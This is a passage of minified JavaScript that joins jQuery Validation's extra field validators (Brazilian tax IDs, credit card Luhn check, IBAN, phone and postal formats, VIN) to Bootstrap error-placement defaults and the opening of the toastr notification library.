(e = 0, s = 2), o = 1, i = a = 0; i < 9; ++i, ++o)a += +t.charAt(i) * o; return 10 <= (n = a % 11) ? n = 0 : n -= s, String(e).concat(n) === t.substr(-2) }, "Please specify a valid CNH number"), g.validator.addMethod("cnpjBR", function (t, e) { "use strict"; if (this.optional(e)) return !0; if (14 !== (t = t.replace(/[^\d]+/g, "")).length) return !1; if ("00000000000000" === t || "11111111111111" === t || "22222222222222" === t || "33333333333333" === t || "44444444444444" === t || "55555555555555" === t || "66666666666666" === t || "77777777777777" === t || "88888888888888" === t || "99999999999999" === t) return !1; for (var n = t.length - 2, i = t.substring(0, n), o = t.substring(n), a = 0, s = n - 7, r = n; 1 <= r; r--)a += i.charAt(n - r) * s--, s < 2 && (s = 9); var g = a % 11 < 2 ? 0 : 11 - a % 11; if (g !== parseInt(o.charAt(0), 10)) return !1; n += 1, i = t.substring(0, n), a = 0, s = n - 7; for (var l = n; 1 <= l; l--)a += i.charAt(n - l) * s--, s < 2 && (s = 9); return (g = a % 11 < 2 ? 0 : 11 - a % 11) === parseInt(o.charAt(1), 10) }, "Please specify a CNPJ value number"), g.validator.addMethod("cpfBR", function (t, e) { "use strict"; if (this.optional(e)) return !0; if (11 !== (t = t.replace(/([~!@#$%^&*()_+=`{}\[\]\-|\\:;'<>,.\/? ])+/g, "")).length) return !1; var n, i = 0, o = parseInt(t.substring(9, 10), 10), a = parseInt(t.substring(10, 11), 10), s = function (t, e) { var n = 10 * t % 11; return 10 !== n && 11 !== n || (n = 0), n === e }; if ("" === t || "00000000000" === t || "11111111111" === t || "22222222222" === t || "33333333333" === t || "44444444444" === t || "55555555555" === t || "66666666666" === t || "77777777777" === t || "88888888888" === t || "99999999999" === t) return !1; for (n = 1; n <= 9; n++)i += parseInt(t.substring(n - 1, n), 10) * (11 - n); if (s(i, o)) { for (i = 0, n = 1; n <= 10; n++)i += parseInt(t.substring(n - 1, n), 10) * (12 - n); return s(i, a) } return !1 }, "Please specify a valid CPF number"), g.validator.addMethod("creditcard", function (t, e) { if (this.optional(e)) return "dependency-mismatch"; if (/[^0-9 \-]+/.test(t)) return !1; var n, i, o = 0, a = 0, s = !1; if ((t = t.replace(/\D/g, "")).length < 13 || 19 < t.length) return !1; for (n = t.length - 1; 0 <= n; n--)i = t.charAt(n), a = parseInt(i, 10), s && 9 < (a *= 2) && (a -= 9), o += a, s = !s; return o % 10 == 0 }, "Please enter a valid credit card number."), g.validator.addMethod("creditcardtypes", function (t, e, n) { if (/[^0-9\-]+/.test(t)) return !1; t = t.replace(/\D/g, ""); var i = 0; return n.mastercard && (i |= 1), n.visa && (i |= 2), n.amex && (i |= 4), n.dinersclub && (i |= 8), n.enroute && (i |= 16), n.discover && (i |= 32), n.jcb && (i |= 64), n.unknown && (i |= 128), n.all && (i = 255), 1 & i && (/^(5[12345])/.test(t) || /^(2[234567])/.test(t)) || 2 & i && /^(4)/.test(t) ? 16 === t.length : 4 & i && /^(3[47])/.test(t) ? 15 === t.length : 8 & i && /^(3(0[012345]|[68]))/.test(t) ? 14 === t.length : 16 & i && /^(2(014|149))/.test(t) ? 15 === t.length : 32 & i && /^(6011)/.test(t) || 64 & i && /^(3)/.test(t) ? 16 === t.length : 64 & i && /^(2131|1800)/.test(t) ? 15 === t.length : !!(128 & i) }, "Please enter a valid credit card number."), g.validator.addMethod("currency", function (t, e, n) { var i = "string" == typeof n, o = i ? n : n[0], a = i || n[1], o = o.replace(/,/g, ""), s = "^[" + (o = a ? o + "]" : o + "]?") + "([1-9]{1}[0-9]{0,2}(\\,[0-9]{3})*(\\.[0-9]{0,2})?|[1-9]{1}[0-9]{0,}(\\.[0-9]{0,2})?|0(\\.[0-9]{0,2})?|(\\.[0-9]{1,2})?)$"; return s = new RegExp(s), this.optional(e) || s.test(t) }, "Please specify a valid currency"), g.validator.addMethod("dateFA", function (t, e) { return this.optional(e) || /^[1-4]\d{3}\/((0?[1-6]\/((3[0-1])|([1-2][0-9])|(0?[1-9])))|((1[0-2]|(0?[7-9]))\/(30|([1-2][0-9])|(0?[1-9]))))$/.test(t) }, g.validator.messages.date), g.validator.addMethod("dateITA", function (t, e) { var n, i, o, a, s, r = !1, r = !!/^\d{1,2}\/\d{1,2}\/\d{4}$/.test(t) && (n = t.split("/"), i = parseInt(n[0], 10), o = parseInt(n[1], 10), a = parseInt(n[2], 10), (s = new Date(Date.UTC(a, o - 1, i, 12, 0, 0, 0))).getUTCFullYear() === a && s.getUTCMonth() === o - 1 && s.getUTCDate() === i); return this.optional(e) || r }, g.validator.messages.date), g.validator.addMethod("dateNL", function (t, e) { return this.optional(e) || /^(0?[1-9]|[12]\d|3[01])[\.\/\-](0?[1-9]|1[012])[\.\/\-]([12]\d)?(\d\d)$/.test(t) }, g.validator.messages.date), g.validator.addMethod("extension", function (t, e, n) { return n = "string" == typeof n ? n.replace(/,/g, "|") : "png|jpe?g|gif", this.optional(e) || t.match(new RegExp("\\.(" + n + ")$", "i")) }, g.validator.format("Please enter a value with a valid extension.")), g.validator.addMethod("giroaccountNL", function (t, e) { return this.optional(e) || /^[0-9]{1,7}$/.test(t) }, "Please specify a valid giro account number"), g.validator.addMethod("greaterThan", function (t, e, n) { var i = g(n); return this.settings.onfocusout && i.not(".validate-greaterThan-blur").length && i.addClass("validate-greaterThan-blur").on("blur.validate-greaterThan", function () { g(e).valid() }), t > i.val() }, "Please enter a greater value."), g.validator.addMethod("greaterThanEqual", function (t, e, n) { var i = g(n); return this.settings.onfocusout && i.not(".validate-greaterThanEqual-blur").length && i.addClass("validate-greaterThanEqual-blur").on("blur.validate-greaterThanEqual", function () { g(e).valid() }), t >= i.val() }, "Please enter a greater value."), g.validator.addMethod("iban", function (t, e) { if (this.optional(e)) return !0; var n, i, o, a, s, r = t.replace(/ /g, "").toUpperCase(), g = "", l = !0, c = ""; if (r.length < 5) return !1; if (void 0 !== (o = { AL: "\\d{8}[\\dA-Z]{16}", AD: "\\d{8}[\\dA-Z]{12}", AT: "\\d{16}", AZ: "[\\dA-Z]{4}\\d{20}", BE: "\\d{12}", BH: "[A-Z]{4}[\\dA-Z]{14}", BA: "\\d{16}", BR: "\\d{23}[A-Z][\\dA-Z]", BG: "[A-Z]{4}\\d{6}[\\dA-Z]{8}", CR: "\\d{17}", HR: "\\d{17}", CY: "\\d{8}[\\dA-Z]{16}", CZ: "\\d{20}", DK: "\\d{14}", DO: "[A-Z]{4}\\d{20}", EE: "\\d{16}", FO: "\\d{14}", FI: "\\d{14}", FR: "\\d{10}[\\dA-Z]{11}\\d{2}", GE: "[\\dA-Z]{2}\\d{16}", DE: "\\d{18}", GI: "[A-Z]{4}[\\dA-Z]{15}", GR: "\\d{7}[\\dA-Z]{16}", GL: "\\d{14}", GT: "[\\dA-Z]{4}[\\dA-Z]{20}", HU: "\\d{24}", IS: "\\d{22}", IE: "[\\dA-Z]{4}\\d{14}", IL: "\\d{19}", IT: "[A-Z]\\d{10}[\\dA-Z]{12}", KZ: "\\d{3}[\\dA-Z]{13}", KW: "[A-Z]{4}[\\dA-Z]{22}", LV: "[A-Z]{4}[\\dA-Z]{13}", LB: "\\d{4}[\\dA-Z]{20}", LI: "\\d{5}[\\dA-Z]{12}", LT: "\\d{16}", LU: "\\d{3}[\\dA-Z]{13}", MK: "\\d{3}[\\dA-Z]{10}\\d{2}", MT: "[A-Z]{4}\\d{5}[\\dA-Z]{18}", MR: "\\d{23}", MU: "[A-Z]{4}\\d{19}[A-Z]{3}", MC: "\\d{10}[\\dA-Z]{11}\\d{2}", MD: "[\\dA-Z]{2}\\d{18}", ME: "\\d{18}", NL: "[A-Z]{4}\\d{10}", NO: "\\d{11}", PK: "[\\dA-Z]{4}\\d{16}", PS: "[\\dA-Z]{4}\\d{21}", PL: "\\d{24}", PT: "\\d{21}", RO: "[A-Z]{4}[\\dA-Z]{16}", SM: "[A-Z]\\d{10}[\\dA-Z]{12}", SA: "\\d{2}[\\dA-Z]{18}", RS: "\\d{18}", SK: "\\d{20}", SI: "\\d{15}", ES: "\\d{20}", SE: "\\d{20}", CH: "\\d{5}[\\dA-Z]{12}", TN: "\\d{20}", TR: "\\d{5}[\\dA-Z]{17}", AE: "\\d{3}\\d{16}", GB: "[A-Z]{4}\\d{14}", VG: "[\\dA-Z]{4}\\d{16}" }[r.substring(0, 2)]) && !new RegExp("^[A-Z]{2}\\d{2}" + o + "$", "").test(r)) return !1; for (n = r.substring(4, r.length) + r.substring(0, 4), a = 0; a < n.length; a++)"0" !== (i = n.charAt(a)) && (l = !1), l || (g += "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ".indexOf(i)); for (s = 0; s < g.length; s++)c = ("" + c + g.charAt(s)) % 97; return 1 === c }, "Please specify a valid IBAN"), g.validator.addMethod("integer", function (t, e) { return this.optional(e) || /^-?\d+$/.test(t) }, "A positive or negative non-decimal number please"), g.validator.addMethod("ipv4", function (t, e) { return this.optional(e) || /^(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)$/i.test(t) }, "Please enter a valid IP v4 address."), g.validator.addMethod("ipv6", function (t, e) { return this.optional(e) || /^((([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4})|(([0-9A-Fa-f]{1,4}:){6}:[0-9A-Fa-f]{1,4})|(([0-9A-Fa-f]{1,4}:){5}:([0-9A-Fa-f]{1,4}:)?[0-9A-Fa-f]{1,4})|(([0-9A-Fa-f]{1,4}:){4}:([0-9A-Fa-f]{1,4}:){0,2}[0-9A-Fa-f]{1,4})|(([0-9A-Fa-f]{1,4}:){3}:([0-9A-Fa-f]{1,4}:){0,3}[0-9A-Fa-f]{1,4})|(([0-9A-Fa-f]{1,4}:){2}:([0-9A-Fa-f]{1,4}:){0,4}[0-9A-Fa-f]{1,4})|(([0-9A-Fa-f]{1,4}:){6}((\b((25[0-5])|(1\d{2})|(2[0-4]\d)|(\d{1,2}))\b)\.){3}(\b((25[0-5])|(1\d{2})|(2[0-4]\d)|(\d{1,2}))\b))|(([0-9A-Fa-f]{1,4}:){0,5}:((\b((25[0-5])|(1\d{2})|(2[0-4]\d)|(\d{1,2}))\b)\.){3}(\b((25[0-5])|(1\d{2})|(2[0-4]\d)|(\d{1,2}))\b))|(::([0-9A-Fa-f]{1,4}:){0,5}((\b((25[0-5])|(1\d{2})|(2[0-4]\d)|(\d{1,2}))\b)\.){3}(\b((25[0-5])|(1\d{2})|(2[0-4]\d)|(\d{1,2}))\b))|([0-9A-Fa-f]{1,4}::([0-9A-Fa-f]{1,4}:){0,5}[0-9A-Fa-f]{1,4})|(::([0-9A-Fa-f]{1,4}:){0,6}[0-9A-Fa-f]{1,4})|(([0-9A-Fa-f]{1,4}:){1,7}:))$/i.test(t) }, "Please enter a valid IP v6 address."), g.validator.addMethod("lessThan", function (t, e, n) { var i = g(n); return this.settings.onfocusout && i.not(".validate-lessThan-blur").length && i.addClass("validate-lessThan-blur").on("blur.validate-lessThan", function () { g(e).valid() }), t < i.val() }, "Please enter a lesser value."), g.validator.addMethod("lessThanEqual", function (t, e, n) { var i = g(n); return this.settings.onfocusout && i.not(".validate-lessThanEqual-blur").length && i.addClass("validate-lessThanEqual-blur").on("blur.validate-lessThanEqual", function () { g(e).valid() }), t <= i.val() }, "Please enter a lesser value."), g.validator.addMethod("lettersonly", function (t, e) { return this.optional(e) || /^[a-z]+$/i.test(t) }, "Letters only please"), g.validator.addMethod("letterswithbasicpunc", function (t, e) { return this.optional(e) || /^[a-z\-.,()'"\s]+$/i.test(t) }, "Letters or punctuation only please"), g.validator.addMethod("maxfiles", function (t, e, n) { return !!this.optional(e) || !("file" === g(e).attr("type") && e.files && e.files.length > n) }, g.validator.format("Please select no more than {0} files.")), g.validator.addMethod("maxsize", function (t, e, n) { if (this.optional(e)) return !0; if ("file" === g(e).attr("type") && e.files && e.files.length) for (var i = 0; i < e.files.length; i++)if (e.files[i].size > n) return !1; return !0 }, g.validator.format("File size must not exceed {0} bytes each.")), g.validator.addMethod("maxsizetotal", function (t, e, n) { if (this.optional(e)) return !0; if ("file" === g(e).attr("type") && e.files && e.files.length) for (var i = 0, o = 0; o < e.files.length; o++)if (n < (i += e.files[o].size)) return !1; return !0 }, g.validator.format("Total size of all files must not exceed {0} bytes.")), g.validator.addMethod("mobileNL", function (t, e) { return this.optional(e) || /^((\+|00(\s|\s?\-\s?)?)31(\s|\s?\-\s?)?(\(0\)[\-\s]?)?|0)6((\s|\s?\-\s?)?[0-9]){8}$/.test(t) }, "Please specify a valid mobile number"), g.validator.addMethod("mobileRU", function (t, e) { var n = t.replace(/\(|\)|\s+|-/g, ""); return this.optional(e) || 9 < n.length && /^((\+7|7|8)+([0-9]){10})$/.test(n) }, "Please specify a valid mobile number"), g.validator.addMethod("mobileUK", function (t, e) { return t = t.replace(/\(|\)|\s+|-/g, ""), this.optional(e) || 9 < t.length && t.match(/^(?:(?:(?:00\s?|\+)44\s?|0)7(?:[1345789]\d{2}|624)\s?\d{3}\s?\d{3})$/) }, "Please specify a valid mobile number"), g.validator.addMethod("netmask", function (t, e) { return this.optional(e) || /^(254|252|248|240|224|192|128)\.0\.0\.0|255\.(254|252|248|240|224|192|128|0)\.0\.0|255\.255\.(254|252|248|240|224|192|128|0)\.0|255\.255\.255\.(254|252|248|240|224|192|128|0)/i.test(t) }, "Please enter a valid netmask."), g.validator.addMethod("nieES", function (t, e) { "use strict"; if (this.optional(e)) return !0; var n, i = new RegExp(/^[MXYZ]{1}[0-9]{7,8}[TRWAGMYFPDXBNJZSQVHLCKET]{1}$/gi), o = t.substr(t.length - 1).toUpperCase(); return !(10 < (t = t.toString().toUpperCase()).length || t.length < 9 || !i.test(t)) && (n = 9 === (t = t.replace(/^[X]/, "0").replace(/^[Y]/, "1").replace(/^[Z]/, "2")).length ? t.substr(0, 8) : t.substr(0, 9), "TRWAGMYFPDXBNJZSQVHLCKET".charAt(parseInt(n, 10) % 23) === o) }, "Please specify a valid NIE number."), g.validator.addMethod("nifES", function (t, e) { "use strict"; return !!this.optional(e) || !!(t = t.toUpperCase()).match("((^[A-Z]{1}[0-9]{7}[A-Z0-9]{1}$|^[T]{1}[A-Z0-9]{8}$)|^[0-9]{8}[A-Z]{1}$)") && (/^[0-9]{8}[A-Z]{1}$/.test(t) ? "TRWAGMYFPDXBNJZSQVHLCKE".charAt(t.substring(8, 0) % 23) === t.charAt(8) : !!/^[KLM]{1}/.test(t) && t[8] === "TRWAGMYFPDXBNJZSQVHLCKE".charAt(t.substring(8, 1) % 23)) }, "Please specify a valid NIF number."), g.validator.addMethod("nipPL", function (t) { "use strict"; if (10 !== (t = t.replace(/[^0-9]/g, "")).length) return !1; for (var e = [6, 5, 7, 2, 3, 4, 5, 6, 7], n = 0, i = 0; i < 9; i++)n += e[i] * t[i]; var o = n % 11; return (10 == o ? 0 : o) === parseInt(t[9], 10) }, "Please specify a valid NIP number."), g.validator.addMethod("nisBR", function (t) { var e, n, i, o, a, s = 0; if (11 !== (t = t.replace(/([~!@#$%^&*()_+=`{}\[\]\-|\\:;'<>,.\/? ])+/g, "")).length) return !1; for (n = parseInt(t.substring(10, 11), 10), e = parseInt(t.substring(0, 10), 10), o = 2; o < 12; o++)10 === (a = o) && (a = 2), 11 === o && (a = 3), s += e % 10 * a, e = parseInt(e / 10, 10); return n === (i = 1 < (i = s % 11) ? 11 - i : 0) }, "Please specify a valid NIS/PIS number"), g.validator.addMethod("notEqualTo", function (t, e, n) { return this.optional(e) || !g.validator.methods.equalTo.call(this, t, e, n) }, "Please enter a different value, values must not be the same."), g.validator.addMethod("nowhitespace", function (t, e) { return this.optional(e) || /^\S+$/i.test(t) }, "No white space please"), g.validator.addMethod("pattern", function (t, e, n) { return !!this.optional(e) || ("string" == typeof n && (n = new RegExp("^(?:" + n + ")$")), n.test(t)) }, "Invalid format."), g.validator.addMethod("phoneNL", function (t, e) { return this.optional(e) || /^((\+|00(\s|\s?\-\s?)?)31(\s|\s?\-\s?)?(\(0\)[\-\s]?)?|0)[1-9]((\s|\s?\-\s?)?[0-9]){8}$/.test(t) }, "Please specify a valid phone number."), g.validator.addMethod("phonePL", function (t, e) { t = t.replace(/\s+/g, ""); return this.optional(e) || /^(?:(?:(?:\+|00)?48)|(?:\(\+?48\)))?(?:1[2-8]|2[2-69]|3[2-49]|4[1-68]|5[0-9]|6[0-35-9]|[7-8][1-9]|9[145])\d{7}$/.test(t) }, "Please specify a valid phone number"), g.validator.addMethod("phonesUK", function (t, e) { return t = t.replace(/\(|\)|\s+|-/g, ""), this.optional(e) || 9 < t.length && t.match(/^(?:(?:(?:00\s?|\+)44\s?|0)(?:1\d{8,9}|[23]\d{9}|7(?:[1345789]\d{8}|624\d{6})))$/) }, "Please specify a valid uk phone number"), g.validator.addMethod("phoneUK", function (t, e) { return t = t.replace(/\(|\)|\s+|-/g, ""), this.optional(e) || 9 < t.length && t.match(/^(?:(?:(?:00\s?|\+)44\s?)|(?:\(?0))(?:\d{2}\)?\s?\d{4}\s?\d{4}|\d{3}\)?\s?\d{3}\s?\d{3,4}|\d{4}\)?\s?(?:\d{5}|\d{3}\s?\d{3})|\d{5}\)?\s?\d{4,5})$/) }, "Please specify a valid phone number"), g.validator.addMethod("phoneUS", function (t, e) { return t = t.replace(/\s+/g, ""), this.optional(e) || 9 < t.length && t.match(/^(\+?1-?)?(\([2-9]([02-9]\d|1[02-9])\)|[2-9]([02-9]\d|1[02-9]))-?[2-9]\d{2}-?\d{4}$/) }, "Please specify a valid phone number"), g.validator.addMethod("postalcodeBR", function (t, e) { return this.optional(e) || /^\d{2}.\d{3}-\d{3}?$|^\d{5}-?\d{3}?$/.test(t) }, "Informe um CEP vÃ¡lido."), g.validator.addMethod("postalCodeCA", function (t, e) { return this.optional(e) || /^[ABCEGHJKLMNPRSTVXY]\d[ABCEGHJKLMNPRSTVWXYZ] *\d[ABCEGHJKLMNPRSTVWXYZ]\d$/i.test(t) }, "Please specify a valid postal code"), g.validator.addMethod("postalcodeIT", function (t, e) { return this.optional(e) || /^\d{5}$/.test(t) }, "Please specify a valid postal code"), g.validator.addMethod("postalcodeNL", function (t, e) { return this.optional(e) || /^[1-9][0-9]{3}\s?[a-zA-Z]{2}$/.test(t) }, "Please specify a valid postal code"), g.validator.addMethod("postcodeUK", function (t, e) { return this.optional(e) || /^((([A-PR-UWYZ][0-9])|([A-PR-UWYZ][0-9][0-9])|([A-PR-UWYZ][A-HK-Y][0-9])|([A-PR-UWYZ][A-HK-Y][0-9][0-9])|([A-PR-UWYZ][0-9][A-HJKSTUW])|([A-PR-UWYZ][A-HK-Y][0-9][ABEHMNPRVWXY]))\s?([0-9][ABD-HJLNP-UW-Z]{2})|(GIR)\s?(0AA))$/i.test(t) }, "Please specify a valid UK postcode"), g.validator.addMethod("require_from_group", function (t, e, n) { var i = g(n[1], e.form), o = i.eq(0), a = o.data("valid_req_grp") ? o.data("valid_req_grp") : g.extend({}, this), s = i.filter(function () { return a.elementValue(this) }).length >= n[0]; return o.data("valid_req_grp", a), g(e).data("being_validated") || (i.data("being_validated", !0), i.each(function () { a.element(this) }), i.data("being_validated", !1)), s }, g.validator.format("Please fill at least {0} of these fields.")), g.validator.addMethod("skip_or_fill_minimum", function (t, e, n) { var i = g(n[1], e.form), o = i.eq(0), a = o.data("valid_skip") ? o.data("valid_skip") : g.extend({}, this), s = i.filter(function () { return a.elementValue(this) }).length, r = 0 === s || s >= n[0]; return o.data("valid_skip", a), g(e).data("being_validated") || (i.data("being_validated", !0), i.each(function () { a.element(this) }), i.data("being_validated", !1)), r }, g.validator.format("Please either skip these fields or fill at least {0} of them.")), g.validator.addMethod("stateUS", function (t, e, n) { var i = void 0 === n, o = !i && void 0 !== n.caseSensitive && n.caseSensitive, a = !i && void 0 !== n.includeTerritories && n.includeTerritories, s = !i && void 0 !== n.includeMilitary && n.includeMilitary, r = a || s ? a && s ? "^(A[AEKLPRSZ]|C[AOT]|D[CE]|FL|G[AU]|HI|I[ADLN]|K[SY]|LA|M[ADEINOPST]|N[CDEHJMVY]|O[HKR]|P[AR]|RI|S[CD]|T[NX]|UT|V[AIT]|W[AIVY])$" : a ? "^(A[KLRSZ]|C[AOT]|D[CE]|FL|G[AU]|HI|I[ADLN]|K[SY]|LA|M[ADEINOPST]|N[CDEHJMVY]|O[HKR]|P[AR]|RI|S[CD]|T[NX]|UT|V[AIT]|W[AIVY])$" : "^(A[AEKLPRZ]|C[AOT]|D[CE]|FL|GA|HI|I[ADLN]|K[SY]|LA|M[ADEINOST]|N[CDEHJMVY]|O[HKR]|PA|RI|S[CD]|T[NX]|UT|V[AT]|W[AIVY])$" : "^(A[KLRZ]|C[AOT]|D[CE]|FL|GA|HI|I[ADLN]|K[SY]|LA|M[ADEINOST]|N[CDEHJMVY]|O[HKR]|PA|RI|S[CD]|T[NX]|UT|V[AT]|W[AIVY])$"; return r = o ? new RegExp(r) : new RegExp(r, "i"), this.optional(e) || r.test(t) }, "Please specify a valid state"), g.validator.addMethod("strippedminlength", function (t, e, n) { return g(t).text().length >= n }, g.validator.format("Please enter at least {0} characters")), g.validator.addMethod("time", function (t, e) { return this.optional(e) || /^([01]\d|2[0-3]|[0-9])(:[0-5]\d){1,2}$/.test(t) }, "Please enter a valid time, between 00:00 and 23:59"), g.validator.addMethod("time12h", function (t, e) { return this.optional(e) || /^((0?[1-9]|1[012])(:[0-5]\d){1,2}(\ ?[AP]M))$/i.test(t) }, "Please enter a valid time in 12-hour am/pm format"), g.validator.addMethod("url2", function (t, e) { return this.optional(e) || /^(https?|ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)*(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(t) }, g.validator.messages.url), g.validator.addMethod("vinUS", function (t) { if (17 !== t.length) return !1; for (var e, n, i, o, a, s = ["A", "B", "C", "D", "E", "F", "G", "H", "J", "K", "L", "M", "N", "P", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"], r = [1, 2, 3, 4, 5, 6, 7, 8, 1, 2, 3, 4, 5, 7, 9, 2, 3, 4, 5, 6, 7, 8, 9], g = [8, 7, 6, 5, 4, 3, 2, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2], l = 0, c = 0; c < 17; c++) { if (i = g[c], n = t.slice(c, c + 1), 8 === c && (a = n), isNaN(n)) { for (e = 0; e < s.length; e++)if (n.toUpperCase() === s[e]) { n = r[e], n *= i, isNaN(a) && 8 === e && (a = s[e]); break } } else n *= i; l += n } return 10 === (o = l % 11) && (o = "X"), o === a }, "The specified vehicle identification number (VIN) is invalid."), g.validator.addMethod("zipcodeUS", function (t, e) { return this.optional(e) || /^\d{5}(-\d{4})?$/.test(t) }, "The specified US ZIP Code is invalid"), g.validator.addMethod("ziprange", function (t, e) { return this.optional(e) || /^90[2-5]\d\{2\}-\d{4}$/.test(t) }, "Your ZIP-code must be in the range 902xx-xxxx to 905xx-xxxx"), g }); var valGetParentContainer = function (t) { t = $(t); return 0 < $(t).closest(".form-group-sub").length ? $(t).closest(".form-group-sub") : 0 < $(t).closest(".bootstrap-select").length ? $(t).closest(".bootstrap-select") : $(t).closest(".form-group") }; jQuery.validator.setDefaults({ errorElement: "div", focusInvalid: !1, ignore: "", errorPlacement: function (t, e) { var e = $(e), n = valGetParentContainer(e), i = n.find(".form-text"); 0 === n.find(".valid-feedback, .invalid-feedback").length && (e.addClass("is-invalid"), t.addClass("invalid-feedback"), 0 < i.length ? i.before(t) : 0 < e.closest(".bootstrap-select").length ? e.closest(".bootstrap-select").find(".bs-placeholder").after(t) : !(0 < e.closest(".input-group").length) && e.is(":checkbox") ? e.closest(".kt-checkbox").find("> span").after(t) : e.after(t)) }, highlight: function (t) { var e = valGetParentContainer(t); e.addClass("validate"), e.addClass("is-invalid"), $(t).removeClass("is-valid") }, unhighlight: function (t) { var e = valGetParentContainer(t); e.removeClass("validate"), e.removeClass("is-invalid"), $(t).removeClass("is-invalid") }, success: function (t, e) { var n = valGetParentContainer(e); n.removeClass("validate"), n.find(".invalid-feedback").remove() } }), jQuery.validator.addMethod("email", function (t, e) { return !!/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(t) }, "Please enter a valid Email."), ("function" == typeof define && define.amd ? define : function (t, e) { "undefined" != typeof module && module.exports ? module.exports = e(require("jquery")) : window.toastr = e(window.jQuery) })(["jquery"], function (A) { return v = 0, a = "error", s = "info", r = "success", g = "warning", t = { clear: function (t, e) { var n = f(); B || p(n), i(t, n, e) || function (t) { for (var e = B.children(), n = e.length - 1; 0 <= n; n--)i(A(e[n]), t) }(n) }, remove: function (t) { var e = f(); return B || p(e), t && 0 === A(":focus", t).length ? void b(t) : void (B.children().length && B.remove()) }, error: function (t, e, n) { return o({ type: a, iconClass: f().iconClasses.error, message: t, optionsOverride: n, title: e }) }, getContainer: p, info: function (t, e, n) { return o({ type: s, iconClass: f().iconClasses.info, message: t, optionsOverride: n, title: e }) }, options: {}, subscribe: function (t) { e = t }, success: function (t, e, n) { return o({ type: r, iconClass: f().iconClasses.success, message: t, optionsOverride: n, title: e }) }, version: "2.1.4", warning: function (t, e, n) { return o({ type: g, iconClass: f().iconClasses.warning, message: t, optionsOverride: n, title: e }) } }; function p(t, e) { return t = t || f(), (B = A("#" + t.containerId)).length || e && (n = t, (B = A("<div/>").attr("id", n.containerId).addClass(n.positionClass)).appendTo(A(n.target))), B; var n } function i(t, e, n) { var i = !(!n || !n.force) && n.force; return t && (i || 0 === A(":focus", t).length) && (t[e.hideMethod]({ duration: e.hideDuration, easing: e.hideEasing, complete: function () { b(t) } }), 1) } function m(t) { e && e(t) } function o(e) { function n(t) { return null == t && (t = ""), t.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/'/g, "&#39;").replace(/</g, "&lt;").replace(/>/g, "&gt;") } function i(t) { var e = t && !1 !== s.closeMethod ? s.closeMethod : s.hideMethod, n = t && !1 !== s.closeDuration ? s.closeDuration : s.hideDuration, i = t && !1 !== s.closeEasing ? s.closeEasing : s.hideEasing; if (!A(":focus", l).length || t) return clearTimeout(d.intervalId), l[e]({ duration: n, easing: i, complete: function () { b(l), clearTimeout(g), s.onHidden && "hidden" !== C.state && s.onHidden(), C.state = "hidden", C.endTime = new Date, m(C) } }) } function t() { (0 < s.timeOut || 0 < s.extendedTimeOut) && (g = setTimeout(i, s.extendedTimeOut), d.maxHideTime = parseFloat(s.extendedTimeOut), d.hideEta = (new Date).getTime() + d.maxHideTime) } function o() { clearTimeout(g), d.hideEta = 0, l.stop(!0, !0)[s.showMethod]({ duration: s.showDuration, easing: s.showEasing }) } function a() { var t = (d.hideEta - (new Date).getTime()) / d.maxHideTime * 100; u.width(t + "%") } var s = f(), r = e.iconClass || s.iconClass; if (void 0 !== e.optionsOverride && (s = A.extend(s, e.optionsOverride), r = e.optionsOverride.iconClass || r), !function (t, e) { if (t.preventDuplicates) { if (e.message === y) return 1; y = e.message } }(s, e)) { v++, B = p(s, !0); var g = null, l = A("<div/>"), c = A("<div/>"), I = A("<div/>"), u = A("<div/>"), h = A(s.closeHtml), d = { intervalId: null, hideEta: null, maxHideTime: null }, C = { toastId: v, state: "visible", startTime: new Date, options: s, map: e }; return e.iconClass && l.addClass(s.toastClass).addClass(r), function () { { var t; e.title && (t = e.title, s.escapeHtml && (t = n(e.title)), c.append(t).addClass(s.titleClass), l.append(c)) } }(), function () { { var t; e.message && (t = e.message, s.escapeHtml && (t = n(e.message)), I.append(t).addClass(s.messageClass), l.append(I)) } }(), s.closeButton 